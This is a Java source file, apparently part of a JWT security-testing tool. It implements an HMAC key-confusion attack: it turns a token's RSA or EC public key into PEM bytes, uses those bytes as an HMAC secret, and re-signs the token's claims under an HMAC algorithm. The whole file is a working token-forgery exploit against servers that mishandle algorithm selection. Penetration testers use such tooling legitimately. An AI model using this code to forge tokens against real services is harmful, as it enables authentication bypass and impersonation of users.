package com.blackberry.jwteditor.operations;

import com.blackberry.jwteditor.exceptions.PemException;
import com.blackberry.jwteditor.exceptions.SigningException;
import com.blackberry.jwteditor.exceptions.UnsupportedKeyException;
import com.blackberry.jwteditor.model.jose.JWS;
import com.blackberry.jwteditor.model.jose.JWSFactory;
import com.blackberry.jwteditor.model.keys.JWKKey;
import com.blackberry.jwteditor.model.keys.JWKKeyFactory;
import com.blackberry.jwteditor.pem.PemKey.NewLineStrategy;
import com.blackberry.jwteditor.pem.PemKeyFactory;
import com.nimbusds.jose.JWSAlgorithm;
import com.nimbusds.jose.JWSHeader;
import com.nimbusds.jose.jwk.OctetSequenceKey;
import com.nimbusds.jose.util.Base64URL;

import static com.nimbusds.jose.JOSEObjectType.JWT;

public class HmacKeyConfusionAttack {

    public static JWS attack(JWS jws, JWKKey key, JWSAlgorithm algorithm, NewLineStrategy newLineStrategy) throws PemException, UnsupportedKeyException, SigningException {
        String publicKeyAsPem = PemKeyFactory.jwkToPemKey(key.getJWK().toPublicJWK()).toString(newLineStrategy);
        byte[] pemBytes = publicKeyAsPem.getBytes();

        // Build a new header for the chosen HMAC algorithm
        JWSHeader signingInfo = new JWSHeader.Builder(algorithm).type(JWT).build();

        // Construct a HMAC signing key from the PEM bytes
        JWKKey signingKey = JWKKeyFactory.from(new OctetSequenceKey.Builder((pemBytes)).build());

        // Sign and return the new JWS
        Base64URL header = signingInfo.toBase64URL();
        Base64URL payload = jws.claims().encoded();

        return JWSFactory.sign(signingKey, header, payload, signingInfo);
    }
}
